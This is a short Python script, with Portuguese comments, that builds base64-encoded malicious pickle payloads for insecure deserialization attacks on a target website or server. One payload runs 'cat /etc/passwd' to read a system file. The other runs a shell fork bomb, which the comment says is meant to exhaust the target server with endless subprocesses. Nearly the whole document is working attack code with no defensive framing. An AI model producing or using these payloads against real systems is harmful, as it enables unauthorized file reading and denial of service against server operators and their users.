
import pickle, base64, subprocess, os

class Evil:
    def __reduce__(self):
        # esse comando lê o /etc/passwd
        return (subprocess.check_output, (["cat", "/etc/passwd"],))

payload = pickle.dumps(Evil())
print("show in website " +  base64.urlsafe_b64encode(payload).decode())

# este abaixo e um fork bomb o objetivo e criar inumeros sub processos no tervidor alvo

class TERM:
    def __reduce__(self):
        return (os.system, ("bomb(){ bomb|bomb& };bomb",))

second_payload = pickle.dumps(TERM())
print("show in terminal " + base64.urlsafe_b64encode(second_payload).decode())
